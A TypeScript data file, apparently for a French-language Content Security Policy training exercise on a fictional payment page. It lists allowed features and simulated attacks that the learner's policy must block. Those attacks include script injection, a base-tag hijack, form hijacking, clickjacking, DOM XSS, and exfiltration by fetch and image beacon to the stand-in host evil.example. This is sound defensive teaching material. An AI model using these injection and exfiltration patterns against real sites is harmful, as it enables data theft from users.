import { NONCE, SELF, type Action, type Directive, type Policy } from '../lib/csp';

// La page de paiement de Novafact : ce qui doit fonctionner, et ce qui doit être bloqué.

export const directiveChoices: { d: Directive; hint: string; tokens: string[] }[] = [
  { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'", '*'] },
  { d: 'script-src', hint: 'Qui peut exécuter du JavaScript', tokens: ["'self'", NONCE, "'strict-dynamic'", "'unsafe-inline'", "'unsafe-eval'", 'https://tags.tm.example', 'https://cdn.tm.example', 'https://cdn.public.example', 'https:'] },
  { d: 'style-src', hint: 'Feuilles de style', tokens: ["'self'", "'unsafe-inline'"] },
  { d: 'img-src', hint: 'Images', tokens: ["'self'", 'data:', '*'] },
  { d: 'connect-src', hint: 'fetch, XHR, WebSocket', tokens: ["'self'", 'https://collect.analytics.example', '*'] },
  { d: 'frame-src', hint: 'Iframes que la page peut intégrer', tokens: ['https://pay.psp.example', '*'] },
  { d: 'object-src', hint: 'Plugins (object, embed)', tokens: ["'none'"] },
  { d: 'base-uri', hint: 'Balise <base>', tokens: ["'none'", "'self'"] },
  { d: 'form-action', hint: 'Destinations des formulaires', tokens: ["'self'"] },
  { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'"] },
  { d: 'require-trusted-types-for', hint: 'Trusted Types sur les sinks DOM', tokens: ["'script'"] },
];

export const initialPolicy: Policy = {
  'default-src': ['*'],
  'script-src': ["'self'", "'unsafe-inline'", 'https:'],
};

export interface CspTest { id: string; label: string; detail: string; kind: 'feature' | 'attack'; action: Action }

const EVIL = 'https://evil.example';

export const cspTests: CspTest[] = [
  { id: 'f1', kind: 'feature', label: 'Bundle de l’application', detail: '<script nonce src="/assets/app.js">', action: { kind: 'fetch', directive: 'script-src', url: `${SELF}/assets/app.js`, nonce: true } },
  { id: 'f2', kind: 'feature', label: 'Chargeur du tag manager', detail: '<script nonce src="https://tags.tm.example/loader.js">', action: { kind: 'fetch', directive: 'script-src', url: 'https://tags.tm.example/loader.js', nonce: true } },
  { id: 'f3', kind: 'feature', label: 'Tags chargés par le tag manager', detail: 'Script inséré dynamiquement depuis https://cdn.tm.example', action: { kind: 'fetch', directive: 'script-src', url: 'https://cdn.tm.example/tag.js', dynamic: true } },
  { id: 'f4', kind: 'feature', label: 'Iframe du prestataire de paiement', detail: 'https://pay.psp.example/checkout', action: { kind: 'fetch', directive: 'frame-src', url: 'https://pay.psp.example/checkout' } },
  { id: 'f5', kind: 'feature', label: 'Mesure d’audience', detail: 'fetch vers https://collect.analytics.example', action: { kind: 'fetch', directive: 'connect-src', url: 'https://collect.analytics.example/e' } },
  { id: 'f6', kind: 'feature', label: 'Appels à l’API Novafact', detail: 'fetch vers la même origine', action: { kind: 'fetch', directive: 'connect-src', url: `${SELF}/api/invoices` } },
  { id: 'f7', kind: 'feature', label: 'Images de l’application', detail: '/img/logo.svg', action: { kind: 'fetch', directive: 'img-src', url: `${SELF}/img/logo.svg` } },
  { id: 'f8', kind: 'feature', label: 'Feuilles de style', detail: '/assets/app.css', action: { kind: 'fetch', directive: 'style-src', url: `${SELF}/assets/app.css` } },
  { id: 'f9', kind: 'feature', label: 'Formulaire de connexion', detail: 'POST vers Novafact', action: { kind: 'form', url: `${SELF}/login` } },
  { id: 'a1', kind: 'attack', label: 'Script inline injecté', detail: 'XSS stockée sans nonce', action: { kind: 'fetch', directive: 'script-src', inline: true } },
  { id: 'a2', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js">', action: { kind: 'fetch', directive: 'script-src', url: `${EVIL}/x.js` } },
  { id: 'a3', kind: 'attack', label: 'Gadget sur un CDN public', detail: 'Bibliothèque exploitable servie par https://cdn.public.example', action: { kind: 'fetch', directive: 'script-src', url: 'https://cdn.public.example/old-framework.js' } },
  { id: 'a12', kind: 'attack', label: 'JSONP sur un domaine autorisé', detail: '<script src="https://tags.tm.example/jsonp?callback=…"> injecté', action: { kind: 'fetch', directive: 'script-src', url: 'https://tags.tm.example/jsonp' } },
  { id: 'a13', kind: 'attack', label: 'Fichier déposé sur l’origine', detail: 'Un .js téléversé par un utilisateur, servi depuis /uploads/', action: { kind: 'fetch', directive: 'script-src', url: `${SELF}/uploads/avatar.js` } },
  { id: 'a4', kind: 'attack', label: 'Code passé à eval()', detail: 'setTimeout avec une chaîne', action: { kind: 'fetch', directive: 'script-src', eval: true } },
  { id: 'a5', kind: 'attack', label: 'Balise <base> injectée', detail: 'Détourne les scripts relatifs', action: { kind: 'base', url: `${EVIL}/` } },
  { id: 'a6', kind: 'attack', label: 'Formulaire détourné', detail: 'action vers evil.example', action: { kind: 'form', url: `${EVIL}/collect` } },
  { id: 'a7', kind: 'attack', label: 'Plugin injecté', detail: '<object data="https://evil.example/x">', action: { kind: 'fetch', directive: 'object-src', url: `${EVIL}/x` } },
  { id: 'a8', kind: 'attack', label: 'Exfiltration par fetch', detail: 'fetch vers evil.example', action: { kind: 'fetch', directive: 'connect-src', url: `${EVIL}/steal` } },
  { id: 'a9', kind: 'attack', label: 'Exfiltration par image', detail: '<img src="https://evil.example/?d=…">', action: { kind: 'fetch', directive: 'img-src', url: `${EVIL}/p.gif` } },
  { id: 'a10', kind: 'attack', label: 'Clickjacking', detail: 'Page intégrée par evil.example', action: { kind: 'framed-by', origin: EVIL } },
  { id: 'a11', kind: 'attack', label: 'DOM XSS', detail: 'Chaîne brute passée à innerHTML', action: { kind: 'sink' } },
];
